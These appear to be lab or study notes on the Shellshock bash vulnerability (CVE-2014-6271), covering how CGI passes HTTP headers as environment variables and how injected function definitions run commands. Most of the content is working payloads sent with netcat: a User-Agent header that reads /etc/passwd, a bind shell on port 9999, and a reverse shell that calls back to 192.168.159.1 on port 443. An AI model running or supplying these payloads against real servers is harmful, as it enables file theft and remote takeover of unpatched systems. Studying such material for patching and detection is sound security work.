# Shell Shock
General
* CVE-2014-6271
* Impacts BASH shell
* Find a CGI that uses Bash

How CGI's Work (Common Gateway Interface)
* CGI's commonly use Python or Perl
* When you call it, server starts process to run CGI
   	* Maybe that is a bash process to run CGI script
* Server passes info to CGI Script
   	* Uses envrionmental variables 
   	* allows server to send headers to CGI
   	* e.g. http header “abc” is an EV called HTTP_ABC

The Vulnerability
* Source of issue: Bash can have internal function declared in it's EV's
* run arbitrary commands after a function declaration
* declare EV is a function by adding () -> add some injected commands to run

Exploit
* netcat
* read arbitrary files:
   	* echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
* Creating an empty function:
   	* () { :;};

Bind Shell
* use netcat to listen on a port and redirect input & output to /bin/sh
* echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
   	* only works if netcat is installed
* if connection hangs, the CGI is waiting for you to connect using: nc vulnerable 9999

Reverse Shell
* bind a port on our system
* find a port that the server is likely to have access to
   	* 21 (FTP), 53 (DNS), 123 (NTP), 80 (HTTP), 443 (HTTPS)
* Try 443 (as root)
   	* nc -l -p 443
* Payload
   	* echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

